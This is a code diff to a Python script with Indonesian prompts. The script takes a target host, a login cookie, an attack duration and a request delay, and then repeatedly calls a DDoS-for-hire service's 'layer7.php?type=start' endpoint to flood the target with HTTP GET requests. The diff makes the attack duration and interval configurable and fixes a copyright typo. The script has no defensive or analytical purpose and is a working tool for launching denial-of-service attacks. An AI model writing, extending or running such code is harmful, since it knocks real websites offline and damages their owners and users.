@@ -3,7 +3,6 @@ import time
 import cowsay
 from tqdm import tqdm
 import sys
-import threading
 
 def slow_print(text, delay=0.05):
     for char in text:
@@ -22,10 +21,12 @@ def animate_cowsay(message):
     cowsay.cow(message)
 
 def main():
-    # Prompt user for name, host URL, and cookie with animation
+    # Prompt user for name, host URL, cookie, attack time, and delay
     name = get_input("Masukkan nama: ")
     host = get_input("Masukkan URL host: ")
     cookie = get_input("Masukkan cookie: ")
+    attack_time = int(get_input("Masukkan waktu (dalam detik) untuk serangan: "))
+    delayt = int(get_input("Masukkan jeda (dalam detik) antar request: "))
 
     # Update the headers with the user-provided cookie
     headers = {
@@ -44,20 +45,19 @@ def main():
         "Priority": "u=1, i"
     }
 
-    url = f"https://ddoser.vip/complexx/layer7.php?type=start&host={host}&port=443&time=10&method=HTTPGET&totalservers=1&vip=undefined"
+    url = f"https://ddoser.vip/complexx/layer7.php?type=start&host={host}&port=443&time={attack_time}&method=HTTPGET&totalservers=1&vip=undefined"
 
     while True:
         try:
             response = requests.get(url, headers=headers)
             if response.status_code == 200:
-            
-                message = f"Copyrigt © mnytc\nNama: {name}\nHost: {host}\nSudah Berjalan..."
+                message = f"Copyright © mnytc\nNama: {name}\nHost: {host}\nSudah Berjalan..."
                 animate_cowsay(message)
             else:
                 slow_print(f"Error: {response.status_code}")
         except Exception as e:
             slow_print(f"Terjadi kesalahan: {e}")
-        time.sleep(11)  # Delay 100 detik sebelum request berikutnya
+        time.sleep(delayt)  # Delay sesuai input pengguna
 
 if __name__ == "__main__":
     main()
